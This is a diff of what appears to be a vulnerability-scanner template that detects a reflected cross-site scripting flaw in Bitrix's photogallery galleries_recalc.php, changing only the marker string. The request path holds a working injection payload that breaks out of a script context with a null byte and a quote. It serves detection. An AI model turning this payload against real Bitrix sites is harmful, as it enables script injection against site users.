@@ -17,12 +17,12 @@ info:
 http:
   - method: GET
     path:
-      - '{{BaseURL}}/bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00%27}};alert("METASCAN");if(1){//'
+      - '{{BaseURL}}/bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00%27}};alert("CRTH0");if(1){//'
 
     matchers:
       - type: dsl
         dsl:
           - 'status_code == 200'
-          - 'contains(body, "alert(\"METASCAN\");if(1){")'
+          - 'contains(body, "alert(\"CRTH0\");if(1){")'
           - 'contains(body, "PhotoGalleryRecalcStart")'
         condition: and
